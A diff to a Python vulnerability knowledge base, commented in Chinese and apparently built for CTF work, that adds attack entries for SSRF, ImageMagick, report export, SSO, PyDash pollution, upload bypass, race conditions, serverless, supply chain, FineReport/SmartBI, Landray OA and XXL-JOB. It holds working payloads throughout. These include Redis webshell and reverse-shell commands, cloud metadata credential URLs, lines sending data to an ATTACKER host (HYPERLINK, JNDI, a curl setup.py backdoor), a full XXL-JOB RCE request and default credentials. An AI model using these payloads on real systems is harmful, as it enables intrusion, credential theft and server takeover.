@@ -169,29 +169,43 @@ VULN_ENTRIES: list[dict[str, Any]] = [
     {
         "id": "ssrf",
         "name": "Server-Side Request Forgery (SSRF)",
-        "keywords": ["ssrf", "url", "fetch", "proxy", "内网", "请求伪造", "redirect", "webhook", "callback"],
-        "description": "诱使服务器向内部网络或任意地址发起请求。",
+        "keywords": ["ssrf", "url", "fetch", "proxy", "内网", "请求伪造", "redirect", "webhook", "callback", "gopher", "dict"],
+        "description": "诱使服务器向内部网络或任意地址发起请求。通过Gopher协议可攻击Redis/MySQL/FastCGI等内网服务。",
         "detection": [
             "在 URL 参数中提交 http://127.0.0.1 或内网地址",
             "尝试访问云元数据: http://169.254.169.254/latest/meta-data/",
             "尝试 file:///etc/passwd 协议",
-            "检查参数: url= / target= / proxy= / callback= / webhook=",
+            "检查参数: url= / target= / proxy= / callback= / webhook= / img= / src=",
+            "尝试 dict://127.0.0.1:6379/info 探测Redis",
         ],
         "payloads": [
             "http://127.0.0.1:80",
             "http://localhost:8080/admin",
-            "http://169.254.169.254/latest/meta-data/",
+            "# 云元数据(AWS/腾讯云/阿里云):",
             "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            "http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/",
+            "http://100.100.100.200/latest/meta-data/ram/security-credentials/  # 阿里云",
             "file:///etc/passwd",
-            "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
+            "file:///flag",
+            "# Gopher打Redis写WebShell:",
+            "python3 scripts/exploits/ssrf_exploit.py redis-shell --web-dir /var/www/html",
+            "# Gopher打Redis写SSH Key:",
+            "python3 scripts/exploits/ssrf_exploit.py redis-ssh --pubkey 'ssh-rsa AAAA...'",
+            "# Gopher打Redis反弹Shell:",
+            "python3 scripts/exploits/ssrf_exploit.py redis-cron --ip ATTACKER --port 4444",
+            "# dict协议探测端口:",
             "dict://127.0.0.1:6379/info",
-            "http://0x7f000001/",
-            "http://0177.0.0.1/",
-            "http://[::1]/",
-            "http://127.1/",
+            "dict://127.0.0.1:3306/info",
+            "# IP绕过变形:",
+            "python3 scripts/exploits/ssrf_exploit.py bypass --ip 127.0.0.1",
+            "http://0x7f000001/ / http://0177.0.0.1/ / http://[::1]/ / http://127.1/ / http://2130706433/",
         ],
-        "tools": [],
-        "tips": "云环境重点检查元数据接口。内网端口扫描: 遍历常见端口(22,80,3306,6379,8080,8443,9200)。绕过: 短链、DNS重绑定、IP变形。",
+        "tools": [
+            "python3 scripts/exploits/ssrf_exploit.py list",
+            "python3 scripts/exploits/ssrf_exploit.py cloud  # 云元数据接口列表",
+            "python3 scripts/exploits/ssrf_exploit.py scan --subnet 172.17.0  # 内网扫描payload",
+        ],
+        "tips": "SSRF利用优先级: 1)云元数据获取AK/SK 2)Gopher打Redis(写Shell/SSH/Crontab) 3)file://读取敏感文件 4)内网端口扫描。IP绕过: 十进制/十六进制/八进制/IPv6映射/DNS重绑定。腾讯云metadata.tencentyun.com,阿里云100.100.100.200。",
     },
     # ── SSTI (模板注入) ──────────────────────────────────────────
     {
@@ -1412,28 +1426,387 @@ VULN_ENTRIES: list[dict[str, Any]] = [
             "内存马用于SSTI无回显时,注入后通过新路由/cmd?cmd=xxx执行命令。"
         ),
     },
+    # ── ImageMagick / 图片处理漏洞 ───────────────────────────────
+    {
+        "id": "imagemagick",
+        "name": "ImageMagick / Image Processing Vulnerabilities",
+        "keywords": [
+            "imagemagick", "imagetragick", "convert", "identify", "图片处理",
+            "图片资源", "svg", "mvg", "cve-2016-3714", "ghostscript",
+            "图片上传", "缩略图", "裁剪", "resize", "thumbnail",
+        ],
+        "description": "ImageMagick及相关图片处理库的委托执行、SVG解析、文件类型检测绕过漏洞，常见于头像上传、图片裁剪、缩略图生成功能。",
+        "detection": [
+            "寻找图片上传/裁剪/缩略图生成功能",
+            "检查是否接受 SVG/MVG/PDF 格式上传",
+            "上传 SVG 检查是否被服务端处理(如转换格式/生成缩略图)",
+            "检查响应头是否泄露 ImageMagick 版本",
+        ],
+        "payloads": [
+            "# ImageTragick RCE (CVE-2016-3714) SVG payload:",
+            'python3 scripts/exploits/imagemagick_exploit.py imagetragick "cat /flag" -o payload.svg',
+            "# SVG XXE 读取本地文件:",
+            "python3 scripts/exploits/imagemagick_exploit.py svg-xxe --file /flag -o xxe.svg",
+            "# SVG SSRF 访问内网:",
+            "python3 scripts/exploits/imagemagick_exploit.py svg-ssrf http://127.0.0.1:8080 -o ssrf.svg",
+            "# 图片马(GIF89a + PHP):",
+            'python3 scripts/exploits/imagemagick_exploit.py webshell --format gif -o shell.gif',
+            "# Polyglot JPEG+PHP:",
+            "python3 scripts/exploits/imagemagick_exploit.py webshell --format polyglot -o shell.jpg",
+        ],
+        "tools": [
+            "python3 scripts/exploits/imagemagick_exploit.py list",
+        ],
+        "tips": "图片处理功能是高频漏洞点。优先上传SVG测试XXE/SSRF,再测试ImageTragick RCE。GIF89a图片马+LFI包含是经典组合。",
+    },
+    # ── 报表/导出系统漏洞 ────────────────────────────────────────
+    {
+        "id": "report_export",
+        "name": "Report Export / 报表引擎漏洞",
+        "keywords": [
+            "报表", "导出", "export", "excel", "xlsx", "csv", "pdf",
+            "xls", "docx", "公式注入", "formula", "dde", "报表引擎",
+            "jasper", "birt", "帆软", "finereport", "smartbi",
+            "wkhtmltopdf", "puppeteer", "weasyprint",
+        ],
+        "description": "报表导出系统漏洞: Excel公式注入(DDE/CSV Injection)、OOXML XXE(在xlsx/docx中嵌入XML实体)、PDF生成器SSRF/LFI、报表模板注入等。国内企业大量使用帆软/SmartBI等报表系统。",
+        "detection": [
+            "寻找导出Excel/PDF/Word功能",
+            "检查导出的文件是否包含用户可控内容",
+            "上传xlsx/docx文件看是否被服务端解析",
+            "检查PDF是否由 wkhtmltopdf/puppeteer 生成(检查PDF元数据)",
+        ],
+        "payloads": [
+            "# Excel公式注入(在可导出的输入字段中填入):",
+            '=cmd|"/C calc"!A0',
+            '=HYPERLINK("http://ATTACKER/steal?d="&A1)',
+            "# XLSX XXE(生成恶意xlsx上传):",
+            "python3 scripts/exploits/report_export_exploit.py xlsx-xxe --file /flag -o evil.xlsx",
+            "# DOCX XXE:",
+            "python3 scripts/exploits/report_export_exploit.py docx-xxe --file /flag -o evil.docx",
+            "# PDF生成器SSRF(在导出PDF的输入中注入HTML):",
+            '<iframe src="file:///flag" width="800" height="600"></iframe>',
+            '<iframe src="http://127.0.0.1:8080/admin" width="800" height="600"></iframe>',
+            "# 帆软报表漏洞:",
+            "python3 scripts/exploits/report_export_exploit.py finereport",
+        ],
+        "tools": [
+            "python3 scripts/exploits/report_export_exploit.py list",
+        ],
+        "tips": "报表导出是国内企业系统的高频功能。OOXML(xlsx/docx)本质是zip+xml,可在xml中嵌入XXE。wkhtmltopdf的SSRF/LFI通过HTML标签触发(iframe/object/embed)。帆软报表(FineReport)在国内企业中非常常见,默认无密码。",
+    },
+    # ── SSO/统一认证漏洞 ─────────────────────────────────────────
+    {
+        "id": "sso_auth",
+        "name": "SSO/统一认证/CAS/OAuth 漏洞",
+        "keywords": [
+            "sso", "统一认证", "单点登录", "cas", "oauth", "oidc",
+            "saml", "认证服务", "apereo", "keycloak", "ldap", "ad",
+            "redirect_uri", "callback", "ticket", "token",
+        ],
+        "description": "统一认证服务漏洞: CAS反序列化RCE、OAuth redirect_uri绕过、SAML签名绕过/XXE、JWT伪造、Spring Security路径绕过等。CAS是国内企业/高校最常用的SSO方案。",
+        "detection": [
+            "检查 /cas/login (CAS登录页)",
+            "检查 /cas/status /cas/actuator (CAS管理端)",
+            "检查 OAuth 授权端点: /oauth/authorize / /auth/realms/",
+            "检查 SAML 端点: /saml/SSO / /saml/metadata",
+            "尝试默认凭据: casuser:Mellon / admin:admin",
+        ],
+        "payloads": [
+            "# CAS 漏洞利用:",
+            "python3 scripts/exploits/sso_exploit.py cas http://TARGET",
+            "# OAuth redirect_uri 绕过:",
+            "python3 scripts/exploits/sso_exploit.py oauth http://TARGET/callback",
+            "# SAML XXE:",
+            "python3 scripts/exploits/sso_exploit.py saml-xxe --file /flag",
+            "# JWT alg:none + 弱密钥伪造:",
+            "python3 scripts/exploits/sso_exploit.py jwt-forge --role admin --user admin",
+            "# Spring Security 路径绕过:",
+            "python3 scripts/exploits/sso_exploit.py spring-bypass http://TARGET",
+            "# CAS默认凭据: casuser:Mellon",
+            "# CAS Log4Shell: 在username字段注入 ${jndi:ldap://ATTACKER/a}",
+        ],
+        "tools": [
+            "python3 scripts/exploits/sso_exploit.py list",
+        ],
+        "tips": "CAS是国内企业/高校最常用的SSO。Apereo CAS 4.x默认有反序列化漏洞。OAuth的redirect_uri绕过可窃取授权码。CAS的actuator端点可能泄露配置信息。先试默认凭据casuser:Mellon。",
+    },
+    # ── Python原型链污染(PyDash) ─────────────────────────────────
+    {
+        "id": "pydash_pollution",
+        "name": "PyDash / Python Prototype Pollution",
+        "keywords": [
+            "pydash", "原型链污染", "python", "prototype pollution",
+            "__class__", "__init__", "__globals__", "set_", "merge",
+            "deep merge", "深合并", "class pollution",
+        ],
+        "description": "PyDash库的set_()和merge()函数允许通过__class__.__init__.__globals__路径污染Python对象属性。在Flask/Jinja2环境下可通过污染SECRET_KEY伪造Session,或通过Jinja2全局变量注入实现RCE。",
+        "detection": [
+            "检查后端是否使用 PyDash 库 (import pydash)",
+            "在JSON输入中尝试 {\"__class__\":\"test\"} 观察响应",
+            "检查是否使用 deep merge / nested set 函数处理用户输入",
+            "检查Flask应用(通过Server头或报错页面识别)",
+        ],
+        "payloads": [
+            "# 生成污染payload:",
+            "python3 scripts/exploits/pydash_exploit.py payloads --cmd 'cat /flag'",
+            "# Flask污染检测步骤:",
+            "python3 scripts/exploits/pydash_exploit.py detect",
+            "# 生成特定键值的JSON:",
+            "python3 scripts/exploits/pydash_exploit.py json --key __class__.__init__.__globals__.SECRET_KEY --value hacked",
+            "# 常用污染路径:",
+            "POST JSON: {\"__class__\":{\"__init__\":{\"__globals__\":{\"SECRET_KEY\":\"hacked\"}}}}",
+            "# 污染后伪造Flask session:",
+            "flask-unsign --sign --cookie '{\"admin\":true}' --secret 'hacked'",
+        ],
+        "tools": [
+            "python3 scripts/exploits/pydash_exploit.py list",
+        ],
+        "tips": "PyDash原型链污染的核心路径是 __class__.__init__.__globals__。最实用的利用是污染 Flask SECRET_KEY 然后伪造 admin session。如果有Jinja2模板渲染,可以污染全局变量实现RCE。Unicode编码可绕过关键字过滤。",
+    },
+    # ── 文件签名绕过 ─────────────────────────────────────────────
+    {
+        "id": "file_signature",
+        "name": "File Signature / Magic Bytes 绕过",
+        "keywords": [
+            "文件签名", "magic bytes", "文件头", "文件类型检测",
+            "mime", "文件上传绕过", "签名审计", "polyglot",
+            "双扩展名", "空字节", "图片马",
+        ],
+        "description": "通过伪造文件头部Magic Bytes、双扩展名、Content-Type篡改、空字节截断等方式绕过文件类型检测和上传限制。",
+        "detection": [
+            "检查文件上传功能的检测方式(扩展名/Content-Type/Magic Bytes/内容检查)",
+            "尝试各种绕过方法组合",
+            "检查上传后文件是否被重命名/重处理",
+        ],
+        "payloads": [
+            "# 生成带magic bytes的payload文件:",
+            "python3 scripts/exploits/file_signature_bypass.py generate gif -o shell.gif",
+            "python3 scripts/exploits/file_signature_bypass.py generate png -o shell.png",
+            "python3 scripts/exploits/file_signature_bypass.py generate jpeg -o shell.jpg",
+            "python3 scripts/exploits/file_signature_bypass.py generate pdf -o shell.pdf",
+            "# 生成绕过用文件名列表:",
+            "python3 scripts/exploits/file_signature_bypass.py filenames --base shell",
+            "# 完整的文件上传绕过清单:",
+            "python3 scripts/exploits/file_signature_bypass.py checklist",
+            "# .htaccess让jpg执行PHP:",
+            "python3 scripts/exploits/file_signature_bypass.py htaccess",
+        ],
+        "tools": [
+            "python3 scripts/exploits/file_signature_bypass.py list",
+        ],
+        "tips": "文件签名审计题通常需要让文件通过多重检测(扩展名+Content-Type+Magic Bytes)。GIF89a图片马最简单。PNG的tEXt chunk可以存放任意数据。JPEG的COM段可以嵌入代码。Polyglot文件同时是有效图片和有效代码。",
+    },
+    # ── 竞态条件利用 ─────────────────────────────────────────────
+    {
+        "id": "race_exploit",
+        "name": "竞态条件 / 并发利用工具",
+        "keywords": [
+            "竞态", "race condition", "并发", "秒杀", "优惠券",
+            "限时", "余额", "双重消费", "toctou", "抢购",
+            "限量", "并发请求", "条件竞争",
+        ],
+        "description": "利用并发请求在检查和使用之间的时间窗口绕过限制,常见于限时秒杀、优惠券使用、余额扣款、投票等场景。",
+        "detection": [
+            "识别一次性操作: 优惠券使用/积分兑换/限量抢购/投票",
+            "识别检查-使用分离: 先验证余额再扣款/先检查库存再下单",
+            "检查是否有分布式锁/事务保护",
+        ],
+        "payloads": [
+            "# 使用并发利用工具:",
+            "python3 scripts/exploits/race_exploit.py http://TARGET/api/redeem -d 'code=ONETIME' -c 20",
+            "# JSON请求体:",
+            "python3 scripts/exploits/race_exploit.py http://TARGET/api/buy -d '{\"item_id\":1}' -c 30 --json-body",
+            "# 带Cookie:",
+            "python3 scripts/exploits/race_exploit.py http://TARGET/api/use_coupon -d 'id=1' -b 'session=xxx' -c 20",
+            "# 只生成curl命令:",
+            "python3 scripts/exploits/race_exploit.py http://TARGET/api/redeem -d 'code=xxx' --curl",
+            "# bash并发:",
+            "for i in $(seq 1 20); do curl -s http://TARGET/api/redeem -d 'code=ONETIME' & done; wait",
+        ],
+        "tools": [
+            "python3 scripts/exploits/race_exploit.py --help",
+        ],
+        "tips": "竞态条件利用的关键是让所有请求尽可能同时到达服务器。Python asyncio + Barrier 可实现精确同步。Burp Suite的Turbo Intruder也很好用。CTF中优惠券/秒杀/限量场景几乎都是竞态条件。",
+    },
+    # ── Serverless / CloudFunc 漏洞 ──────────────────────────────
+    {
+        "id": "serverless",
+        "name": "Serverless / Cloud Function 沙箱逃逸",
+        "keywords": [
+            "serverless", "cloud function", "lambda", "faas",
+            "cloudfunc", "函数计算", "沙箱", "sandbox", "escape",
+            "scf", "云函数", "容器逃逸", "docker escape",
+        ],
+        "description": "Serverless/云函数平台漏洞: 沙箱逃逸、环境变量泄露、临时凭据获取、依赖注入、容器逃逸等。国内常见腾讯云SCF和阿里云FC。",
+        "detection": [
+            "检查是否有代码执行/运行功能(在线编辑器/Function即服务)",
+            "检查环境变量: /proc/self/environ 或 printenv",
+            "检查容器信息: /.dockerenv / /proc/1/cgroup",
+            "检查云元数据: curl http://169.254.169.254/latest/meta-data/",
+        ],
+        "payloads": [
+            "# 环境变量泄露(flag常在env中):",
+            "import os; print(os.environ)",
+            "cat /proc/self/environ | tr '\\0' '\\n'",
+            "printenv | grep -i flag",
+            "# 文件系统探索:",
+            "ls -la / && cat /flag* 2>/dev/null",
+            "find / -name 'flag*' -o -name '*.key' -o -name '*.secret' 2>/dev/null",
+            "# 云元数据获取临时凭据:",
+            "curl -s http://169.254.169.254/latest/meta-data/",
+            "curl -s http://metadata.tencentyun.com/latest/meta-data/",
+            "curl -s http://100.100.100.200/latest/meta-data/  # 阿里云",
+            "# 容器逃逸检测:",
+            "cat /proc/1/cgroup  # 检查是否在容器中",
+            "ls -la /.dockerenv",
+            "mount  # 检查挂载点",
+            "# 依赖投毒/代码注入:",
+            "检查 requirements.txt / package.json 是否可控",
+            "检查导入路径是否可写: sys.path",
+            "# 临时文件利用:",
+            "ls -la /tmp/ && find /tmp -type f",
+        ],
+        "tools": [],
+        "tips": "CloudFunc/Serverless题的flag通常在环境变量或/flag文件中。优先检查env和文件系统。云函数平台的临时凭据(通过元数据接口)可能有更高权限。容器逃逸需要特殊内核漏洞或挂载配置。",
+    },
+    # ── 供应链安全 ───────────────────────────────────────────────
+    {
+        "id": "supply_chain",
+        "name": "供应链安全 / 依赖投毒",
+        "keywords": [
+            "供应链", "supply chain", "投毒", "dependency confusion",
+            "typosquatting", "包投毒", "pip", "npm", "pypi",
+            "package", "依赖", "后门",
+        ],
+        "description": "供应链攻击: 依赖混淆(同名内部包在公共仓库注册)、Typosquatting(仿冒包名)、构建脚本后门(setup.py/install scripts)、恶意依赖注入等。",
+        "detection": [
+            "检查 requirements.txt / package.json 中的依赖名",
+            "对比公共仓库上是否有同名包",
+            "检查 setup.py / setup.cfg / pyproject.toml 中的 install 脚本",
+            "检查 npm scripts (preinstall/postinstall)",
+            "审查不常见/私有包的源码",
+        ],
+        "payloads": [
+            "# 检查Python包是否有恶意setup.py:",
+            "pip download <package> --no-deps && unzip *.whl && cat */setup.py",
+            "# 检查npm包的安装脚本:",
+            "npm pack <package> && tar xzf *.tgz && cat package/package.json | jq '.scripts'",
+            "# Python setup.py 后门示例:",
+            "import os; os.system('curl http://ATTACKER/steal?data=$(cat /flag | base64)')",
+            "# requirements.txt 依赖混淆:",
+            "检查是否有 --index-url 指向私有仓库",
+            "内部包名如果在 pypi.org 上可注册,高版本会被优先安装",
+            "# 检测恶意行为:",
+            "strace -f pip install <package> 2>&1 | grep -E 'connect|exec|open'",
+            "# pip install时的代码执行点:",
+            "setup.py: cmdclass / install / develop / egg_info",
+            "conftest.py: pytest自动加载",
+            "__init__.py: 导入时执行",
+        ],
+        "tools": [],
+        "tips": "供应链投毒CTF题通常需要: 1)找到可疑依赖包 2)审查其安装脚本(setup.py) 3)发现后门代码 4)利用后门获取flag。注意pip install时setup.py中的代码会被执行。npm的preinstall/postinstall脚本也是常见后门点。",
+    },
+    # ── 帆软/SmartBI 报表系统 ────────────────────────────────────
+    {
+        "id": "finereport",
+        "name": "帆软报表(FineReport) / SmartBI 漏洞",
+        "keywords": [
+            "帆软", "finereport", "smartbi", "报表", "webreport",
+            "reportserver", "决策平台", "数据决策", "finebi",
+        ],
+        "description": "帆软报表(FineReport/FineBI/FineDataLink)和SmartBI是国内最常用的BI报表平台。存在export/excel前台RCE、ReportServer模板注入、channel反序列化、目录遍历等高危漏洞。",
+        "detection": [
+            "指纹: URL含 /WebReport/ / /ReportServer / /decision/ / /webroot/decision/",
+            "页面标题含 '数据决策' / 'FineReport' / 'SmartBI' / 'FineBI'",
+            "检查 /WebReport/ReportServer?op=fs_remote_design",
+            "检查 /webroot/decision/system/info (版本信息泄露)",
+            "默认端口: 8075 (帆软) / 18080 (SmartBI)",
+        ],
+        "payloads": [
+            "# ★★★ 最新: export/excel 前台RCE (≤11.5.4) ★★★",
+            "# LargeDatasetExcelExportJS → SQLite VACUUM into() → 写入JSP WebShell",
+            "# POST /webroot/decision/view/ReportServer 构造XML+CONCATENATE拼接SQL",
+            "python3 scripts/exploits/report_export_exploit.py finereport  # 查看完整payload",
+            "# ★★★ ReportServer模板注入+cjkEncode绕WAF ★★★",
+            "# /webroot/decision/view/ReportServer?test= 或 &n= 触发模板注入",
+            "# cjkEncode将字符转[十六进制]格式绕过WAF对${}的检测",
+            "# 新入口: /webroot/decision/nx/report/v9/print/ie/pdf",
+            "# ★★★ channel接口反序列化RCE ★★★",
+            "# POST /webroot/decision/remote/design/channel",
+            "# 支持Jackson/Hibernate/CC链, 需普通用户认证",
+            "# 帆软目录遍历:",
+            "GET /WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=../../etc/passwd",
+            "# 帆软未授权访问后台:",
+            "GET /WebReport/ReportServer?op=fs_remote_design&cmd=design_list_file",
+            "# 帆软默认密码: admin/(空) 或 admin/fr",
+            "# SmartBI 未授权RCE:",
+            "POST /smartbi/vision/RMIServlet  (反序列化入口)",
+            "# SmartBI 默认凭据: admin/admin",
+        ],
+        "tools": [
+            "python3 scripts/exploits/report_export_exploit.py finereport",
+            "nuclei -u http://TARGET -t cves/ -tags finereport",
+        ],
+        "tips": "帆软报表影响: FineReport≤11.5.4, FineBI≤7.0.4, FineDataLink≤5.0.4.2。export/excel RCE是最新最直接的利用(无需认证)。临时修复: 删除sqlite-jdbc-*.jar。cjkEncode编码可绕过WAF对${...}的检测。channel接口工具: github.com/7wkajk/Frchannel。",
+    },
+    # ── 蓝凌OA ────────────────────────────────────────────────────
+    {
+        "id": "oa_landray",
+        "name": "蓝凌OA (Landray/EKP) Vulnerabilities",
+        "keywords": [
+            "蓝凌", "landray", "ekp", "蓝凌oa", "km",
+            "ssrf", "反序列化", "文件读取",
+        ],
+        "description": "蓝凌OA(EKP)存在SSRF任意文件读取、反序列化RCE、XMLDecoder、SQL注入等漏洞。",
+        "detection": [
+            "指纹: URL含 /ekp/ / /km/ / /sys/",
+            "页面标题含 '蓝凌' / 'Landray' / 'EKP'",
+            "FOFA: app=\"蓝凌-EKP\" / body=\"蓝凌\"",
+        ],
+        "payloads": [
+            "# SSRF → 任意文件读取:",
+            "POST /sys/ui/extend/varkind/custom.jsp  var={\"body\":{\"file\":\"file:///flag\"}}",
+            "POST /sys/ui/extend/varkind/custom.jsp  var={\"body\":{\"file\":\"file:///etc/passwd\"}}",
+            "# sysSearchMain 反序列化RCE:",
+            "POST /sys/search/sys_search_main/sysSearchMain.do?method=editParam  (发送恶意序列化数据)",
+            "# 数据库配置泄露:",
+            "GET /kmss/component/BPM/data/config/ds/datasource.xml",
+            "# 默认凭据: admin:admin / admin:landray2015",
+            "# 综合OA利用工具:",
+            "python3 scripts/exploits/oa_exploit.py landray",
+        ],
+        "tools": [
+            "python3 scripts/exploits/oa_exploit.py landray",
+            "nuclei -u http://TARGET -t cves/ -tags landray",
+        ],
+        "tips": "蓝凌OA的SSRF通过custom.jsp的file参数可直接读取任意文件,这是最常用的利用。sysSearchMain反序列化需要构造Java序列化数据。",
+    },
     # ── XXL-JOB ──────────────────────────────────────────────────
     {
         "id": "xxljob",
         "name": "XXL-JOB Unauthorized RCE",
         "keywords": [
             "xxl-job", "xxljob", "任务调度", "executor",
-            "accesstoken", "api", "未授权",
+            "accesstoken", "api", "未授权", "定时任务",
         ],
-        "description": "XXL-JOB 分布式任务调度平台默认 accessToken 或未授权访问导致远程命令执行。",
+        "description": "XXL-JOB 分布式任务调度平台默认 accessToken 或未授权访问导致远程命令执行。国内微服务架构广泛使用。",
         "detection": [
             "访问 /xxl-job-admin/ (默认管理界面)",
             "默认账号 admin:123456",
-            "检查 executor API 是否未授权: POST /run",
+            "检查 executor API 是否未授权: POST :9999/run",
+            "nmap -p 9999 TARGET (executor默认端口)",
         ],
         "payloads": [
-            "# 默认accessToken执行命令:",
-            'POST http://TARGET:9999/run  Content-Type:application/json  {"jobId":1,"executorHandler":"demoJobHandler","executorParams":"","executorBlockStrategy":"SERIAL_EXECUTION","executorTimeout":0,"logId":1,"logDateTime":1586629003729,"glueType":"GLUE_SHELL","glueSource":"cat /flag","glueUpdatetime":1586699003758,"broadcastIndex":0,"broadcastTotal":0}',
-            "# 默认 accessToken: default_token 或为空",
-            "# Header: XXL-JOB-ACCESS-TOKEN: default_token",
+            "# executor未授权命令执行(默认accessToken):",
+            'POST http://TARGET:9999/run  Content-Type: application/json  {"jobId":1,"executorHandler":"demoJobHandler","executorParams":"","executorBlockStrategy":"SERIAL_EXECUTION","executorTimeout":0,"logId":1,"logDateTime":1586629003729,"glueType":"GLUE_SHELL","glueSource":"cat /flag","glueUpdatetime":1586699003758,"broadcastIndex":0,"broadcastTotal":0}',
+            "# Header: XXL-JOB-ACCESS-TOKEN: default_token 或 空",
+            "# Python任务执行:",
+            'glueType: GLUE_PYTHON  glueSource: import os; print(os.popen("cat /flag").read())',
+            "# admin后台 → 新建任务 → GLUE_SHELL → cat /flag → 立即执行",
         ],
         "tools": [],
-        "tips": "XXL-JOB executor默认端口9999,admin默认端口8080。默认accessToken是最常见的利用点。glueType设为GLUE_SHELL/GLUE_PYTHON可执行系统命令。",
+        "tips": "XXL-JOB executor默认端口9999,admin默认端口8080。默认accessToken(default_token或空)是最常见利用点。glueType可设为GLUE_SHELL/GLUE_PYTHON/GLUE_NODEJS执行命令。",
     },
 ]
 
@@ -1486,11 +1859,34 @@ TOOL_COMMANDS: dict[str, list[dict[str, str]]] = {
 
 
 class VulnKnowledgeBase:
-    """漏洞知识库，支持关键词检索。"""
+    """漏洞知识库，支持关键词检索。
 
-    def __init__(self) -> None:
-        self._entries = VULN_ENTRIES
-        self._tool_cmds = TOOL_COMMANDS
+    支持从外部 YAML 文件加载额外条目（data/vuln_entries.yaml），
+    内置条目作为 fallback 保底。
+    """
+
+    def __init__(self, extra_entries_path: str | None = None) -> None:
+        self._entries = list(VULN_ENTRIES)
+        self._tool_cmds = dict(TOOL_COMMANDS)
+        if extra_entries_path:
+            self._load_extra(extra_entries_path)
+
+    def _load_extra(self, path: str) -> None:
+        """从 YAML/JSON 文件加载额外漏洞条目。"""
+        from pathlib import Path
+        p = Path(path)
+        if not p.is_file():
+            return
+        try:
+            import json
+            data = json.loads(p.read_text(encoding="utf-8"))
+            if isinstance(data, list):
+                existing_ids = {e["id"] for e in self._entries}
+                for entry in data:
+                    if isinstance(entry, dict) and entry.get("id") not in existing_ids:
+                        self._entries.append(entry)
+        except Exception:
+            pass
 
     def search(self, query: str, max_results: int = 5) -> str:
         """根据关键词搜索漏洞知识，返回匹配条目的摘要。"""
